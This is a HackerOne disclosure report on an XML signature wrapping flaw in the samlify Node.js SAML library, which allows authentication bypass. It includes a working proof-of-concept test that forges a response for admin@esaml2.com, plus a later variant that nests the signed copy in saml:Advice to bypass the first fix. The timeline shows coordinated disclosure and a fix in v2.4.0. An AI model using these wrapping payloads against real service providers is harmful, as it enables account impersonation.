---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cryptographic-issues-generic
  - env/web
  - stack/node
  - vuln/authentication-bypass
substate: "resolved"
weakness: "Cryptographic Issues - Generic"
enriched: true
body: true
date: 2018-10-23
submitted: 2018-05-23T07:11:09.848Z
bounty_usd: null
votes: 7
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "webtonull"
source: "https://hackerone.com/reports/356284"
title: "Samlify is vulnerable to signature wrapping"
---
# Samlify is vulnerable to signature wrapping

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2018-10-23

- Report: [https://hackerone.com/reports/356284](https://hackerone.com/reports/356284)
- CWE: Cryptographic Issues - Generic
- Submitted: 2018-05-23T07:11:09.848Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a signature wrapping weakness in samlify
It allows an attacker to modify a SAML token received from the IdP before validating it with the service provider

# Module

**module name:** samlify
**version:** 2.3.7
**npm page:** `https://www.npmjs.com/package/samlify`

## Module Description

Highly configuarable Node.js SAML 2.0 library for Single Sign On

## Module Stats

> Replace stats below with numbers from npm’s module page:

1084 downloads in the last week

# Vulnerability

## Vulnerability Description

It's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.

## Steps To Reproduce:

Clone the github repo, put this in `test/flow.ts` and run `npm run test`:
```

test('should reject signature wrapped response', async t => {
  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)
  const user = { email: 'user@esaml2.com' };
  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));
  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)

  //Decode
  var buffer = new Buffer(SAMLResponse, "base64");
  var xml = buffer.toString();
  //Create version of response without signature
  var stripped = xml
    .replace(/<ds:Signature[\s\S]*ds:Signature>/, "");
  //Create version of response with altered IDs and new username
  var outer = xml
    .replace(/assertion" ID="_[0-9a-f]{3}/g, 'assertion" ID="_000')
    .replace("user@esaml2.com", "admin@esaml2.com");
  //Put stripped version under SubjectConfirmationData of modified version
  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\/>/, "<saml:SubjectConfirmationData>" + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', "") + "</saml:SubjectConfirmationData>");
  const wrappedResponse = new Buffer(xmlWrapped).toString("base64");

  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });
  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));
  //This tampering goes undetected....and only fails because there are now two names
  t.is(extract.nameid, 'user@esaml2.com');
});
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04
- v7.4.0
- 6.0.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

I will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.

## Impact

Authentication bypass

## Timeline

- **2018-05-23** @webtonull: I confirm it is reproducable, the impact has been describe and that it is in scope
- **2018-05-23** @webtonull: Module owner has now been notified
- **Report Filed**
- **2018-05-24** @marcinhoppe: Hi @webtonull, 

Thanks a lot for reporting the vulnerability. I will take a look at your report and triage it shortly!

Thanks for proactively reaching out to the maintainer. I also invited package owner to this HackerOne.
- **External User Joined**
- **2018-05-24** @tngan: Hello @webtonull, @marcinhoppe 

There are potentially two holes in samlify.

In SAML standard, it is required that the response to get signed, either whole message or assertion. Therefore, the side parsing response should validate the signature no matter what, so that could be a bug inside the parseResponse function that doesn't check the signature compulsorily.

We have schema checking to SAMLResponse as well, I will need some time to figure why it doesn't detect the wrapping section.

Again, thank you so much to report this.
- **2018-05-24** @webtonull: The schema validation didn't detect it because I intentionally put the signed response under  `<saml:SubjectConfirmationData>` which can contain anything:
https://github.com/tngan/samlify/blob/master/schemas/saml-schema-assertion-2.0.xsd#L106

The wrapping goes like this:

```
<FakeResponse>
   <SignatureOnSignedResponse>...</>
   ...
   <SubjectConfirmationData>
     <SignedResponse>...</>
  </SubjectConfirmationData>
   ...
</FakeResponse>
```

The problem is that what is signed is not necessarily what is being used. The signature's reference is still pointing to an element that can be verified, but that's not necessarily the one being used. 
The flexibility of XML signatures is also one of its weaknesses, as it becomes hard to verify it correctly.
If you expect the signature to sign the outer assertion, you should check that the reference in the signature points to the outer element. Basically you have to ensure that the signed element is the one that is being used.
- **2018-05-27** @tngan: That schema assertion is downloaded from OASIS, those libraries validate the response using that schema might also expose to the wrapping vulnerability if they didn't handle the context extraction properly.
  
I am thinking that I should make the xpath more specific instead of searching the context of signature globally.
- **2018-05-28** @webtonull: This is a well known problem in the security space. See chapter 3.2 and chapter 4 in this article: https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf
Chapter 7.5 and 7.6 contain counter measures.
- **Report Triaged**
- **2018-07-04** @marcinhoppe: @tngan Is there a fix for this vulnerability?
- **2018-07-18** @marcinhoppe: I reached out to the maintainer once again over e-mail and will wait another day for a follow-up.
- **2018-07-19** @marcinhoppe: @tngan got back to me and he is working on the fix. My recommendation is to hold the disclosure until the fix is available.
- **2018-07-19** @webtonull: Ok, good
- **Report Severity Updated**
- **Changed Scope**
- **2018-09-27** @marcinhoppe: @webtonull can you verify that https://github.com/tngan/samlify/releases/tag/v2.4.0-rc4 fixed this vulnerability? That would be huge help!
- **2018-09-27** @webtonull: I believe it is still possible to bypass the validation. Try replacing line https://github.com/tngan/samlify/blob/master/test/flow.ts#L574
`const xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\/>/, '<saml:SubjectConfirmationData>' + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', '') + '</saml:SubjectConfirmationData>');`
with
`const xmlWrapped = outer.replace(/<\/saml:Conditions>/, '</saml:Conditions><saml:Advice>' + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', '') + '</saml:Advice>');`
- **2018-09-27** @webtonull: @tngan In stead of looking for malicious elements, you should verify that the element referenced in the signature is indeed the assertion in the correct place in the xml (/Response/Assertion)
- **2018-09-28** @tngan: @webtonull I see. Is it safe to use the URI specified in the `Reference` ? What if the signature is for the entire xml, there are two types of signature declared in saml standard, one is for assertion, another one is for message, either one of them are required, or both.
- **2018-09-28** @tngan: I am modifying a little bit of the flow. The desired assertion node should be set after all the signatures are being verified.
- **2018-09-28** @tngan: https://github.com/tngan/samlify/commit/d382bbc7c6b8ea889839ae1f178730c25b09eb42#diff-269b9d2e1bae34dc86738f5a75a21e0fR424

That's the latest commit. The assignment of that assertion node used to extract information after all the signature are verified.
- **2018-09-28** @webtonull: @tngan Yes, this looks like a better solution. I don't see any immediate bypasses at least. Now the signed assertion/response has to be in the right position.
- **2018-10-01** @webtonull: @marcinhoppe @tngan I think we can close this now
- **2018-10-01** @marcinhoppe: @webtonull Many thanks!

@tngan Let me know when the package with the fix is released and I will disclose it.
- **2018-10-02** @tngan: @marcinhoppe Hi, can we target the end of this week ? Right now the version is still relase candidate, I want to wrap up something to release an official version instead of disclosing this issues with a rc.
- **2018-10-02** @marcinhoppe: @tngan Sure, just let me know when the final version of the package has been released. I will resolve this report now but will wait with the disclosure.
- **Report Resolved**
- **Agreed On Going Public**
- **2018-10-19** @marcinhoppe: @tngan Is the final package ready? The vulnerability will be disclosed in about 12 days from now but we can expedite it if the package has been released.
- **2018-10-20** @tngan: Yes, v2.4.0 is just released.
- **2018-10-22** @webtonull: @tngan Great!
- **Manually Disclosed**
